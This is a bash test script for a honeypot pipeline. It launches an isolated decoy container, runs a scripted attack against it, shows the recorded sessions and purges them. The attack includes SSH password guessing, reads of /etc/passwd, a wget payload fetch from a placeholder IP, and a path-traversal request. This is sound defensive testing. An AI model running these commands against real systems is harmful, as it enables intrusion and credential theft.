#!/usr/bin/env bash
#
# End-to-end test of the capture pipeline with traffic that can never be
# mistaken for a real attack.
#
#   sudo bash controlled-test.sh            # run, show what was recorded, keep it
#   sudo bash controlled-test.sh --purge    # run, show it, then delete it
#   sudo bash controlled-test.sh --purge-only
#
# A throwaway engine registers as `controlled-test-node` on the internal
# engine network, with no published ports, and a scripted client attacks it
# from another container on that network. The production engine and its
# decoy ports are never touched, so nothing self-generated is recorded
# against them. Every row this produces hangs off the controlled-test-node
# node, which is how it stays distinguishable in the data (and how --purge
# finds it).

set -euo pipefail
cd "$(dirname "$0")"

NODE=controlled-test-node
IMAGE=honeysentinel-honeypot
NET=honeysentinel_engine

psql() { docker compose exec -T postgres psql -U honeypot -d honeysentinel -v ON_ERROR_STOP=1 "$@"; }

purge() {
  psql -q <<SQL
begin;
create temp table t on commit drop as
  select s.id from honeypot_sessions s join honeypot_nodes n on n.id = s.node_id
  where n.name = '$NODE';
create temp table t_samples on commit drop as
  select distinct sample_id from session_artifacts where session_id in (select id from t);
delete from alerts where session_id in (select id from t);
delete from indicators_of_compromise where session_id in (select id from t);
delete from honeypot_sessions where id in (select id from t);  -- artifacts cascade
-- A sample also seen in a real session stays; one only the test produced goes.
delete from payload_samples p where p.id in (select sample_id from t_samples)
  and not exists (select 1 from session_artifacts a where a.sample_id = p.id);
delete from honeypot_nodes where name = '$NODE';
commit;
SQL
  echo "Purged everything recorded under $NODE."
}

if [[ "${1:-}" == --purge-only ]]; then purge; exit 0; fi

set -a; . ./.env; set +a

docker rm -f hs-test >/dev/null 2>&1 || true
echo "==> Starting a throwaway engine as $NODE"
docker run -d --name hs-test --network "$NET" \
  --read-only --tmpfs /tmp:noexec,nosuid --tmpfs /app/data:uid=10001,gid=10001 \
  --cap-drop ALL --security-opt no-new-privileges:true --dns 127.0.0.1 \
  -e HONEYPOT_CONTAINER=true -e HONEYPOT_NODE_NAME="$NODE" \
  -e HONEYPOT_PROTOCOLS=ssh,http -e HONEYPOT_CONTROL_BIND=127.0.0.1 \
  -e HONEYPOT_CAPTURE_DIR=/app/data/sessions -e HONEYPOT_FILE_CAPTURE_DIR=/app/data/uploads \
  -e HONEYPOT_LOG_DIR=/app/data/logs \
  -e BACKEND_API_URL=http://ingest:8000/api/v1 -e HONEYPOT_INGEST_TOKEN="$HONEYPOT_INGEST_TOKEN" \
  "$IMAGE" >/dev/null
trap 'docker rm -f hs-test >/dev/null 2>&1 || true' EXIT

for _ in $(seq 1 30); do
  docker logs hs-test 2>&1 | grep -q "All honeypot services started" && break
  sleep 1
done

echo "==> Attacking it"
docker run --rm -i --network "$NET" --dns 127.0.0.1 --cap-drop ALL "$IMAGE" python - <<'PY'
import asyncio, urllib.request
import asyncssh

COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "wget http://203.0.113.10/bins/x86 -O /tmp/x86",
    # A two-line shell script written through base64, which the engine's
    # capture interpreter reconstructs without running anything.
    "echo IyEvYmluL3NoCmVjaG8gY29udHJvbGxlZC10ZXN0Cg== | base64 -d > /tmp/ct.sh",
    "chmod +x /tmp/ct.sh",
]

async def ssh():
    for password in ("123456", "admin123", "toor"):
        try:
            async with asyncssh.connect("hs-test", 2222, username="root", password=password,
                                        known_hosts=None):
                pass
        except asyncssh.PermissionDenied:
            print(f"  ssh root/{password}: denied")
    async with asyncssh.connect("hs-test", 2222, username="root", password="root",
                                known_hosts=None) as conn:
        print("  ssh root/root: accepted")
        for cmd in COMMANDS:
            result = await conn.run(cmd)
            print(f"  $ {cmd[:60]} -> {len(result.stdout or '')} bytes")

asyncio.run(ssh())
req = urllib.request.Request("http://hs-test:8080/../../etc/passwd",
                             headers={"User-Agent": "sqlmap/1.8"})
try:
    urllib.request.urlopen(req, timeout=5).read()
except Exception as exc:
    pass
print("  http GET /../../etc/passwd (sqlmap UA): sent")
PY

echo "==> Waiting for ingest"
sleep 8

echo "==> Recorded under $NODE"
psql -P pager=off <<SQL
select s.id, s.protocol, s.attacker_ip, s.attack_category, s.model_source,
       s.command_count, s.detected_tools, s.geo_country
from honeypot_sessions s join honeypot_nodes n on n.id = s.node_id
where n.name = '$NODE' order by s.id;
select a.filename, p.file_type, p.analysis_status, left(p.sha256, 16) as sha256
from session_artifacts a join payload_samples p on p.id = a.sample_id
join honeypot_sessions s on s.id = a.session_id join honeypot_nodes n on n.id = s.node_id
where n.name = '$NODE';
SQL

if [[ "${1:-}" == --purge ]]; then purge; fi
